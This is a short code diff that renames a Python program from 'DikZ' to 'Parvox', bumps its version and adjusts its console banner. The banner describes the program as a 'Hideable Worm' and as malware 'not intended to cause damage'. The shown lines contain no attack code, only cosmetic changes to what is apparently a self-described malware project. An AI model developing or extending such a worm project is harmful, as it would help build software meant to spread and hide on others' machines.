@@ -2,8 +2,8 @@ import os
 from colorama import Fore, Back
 from adder import *
 
-M_VERSION = 1.0
-M_NAME = "DikZ"
+M_VERSION = 1.8
+M_NAME = "Parvox"
 
 def os_comp():
     if os.name != "nt":
@@ -18,7 +18,7 @@ def cls():
 def logo_com():
     print(f"""{Fore.LIGHTRED_EX}
 ╔════════════════════╗ ╔═══════════════════════════════════╗
-║        {Fore.YELLOW}{M_NAME}{Fore.LIGHTRED_EX}        ║ ║        This malware is not        ║
+║      {Fore.YELLOW}{M_NAME}{Fore.LIGHTRED_EX}        ║ ║        This malware is not        ║
 ║    Multi Module    ║ ║     intended to cause damage      ║
 ║   Hideable Worm    ║ ║      to third party devices.      ║
 ╚════════════════════╝ ╚═══════════════════════════════════╝
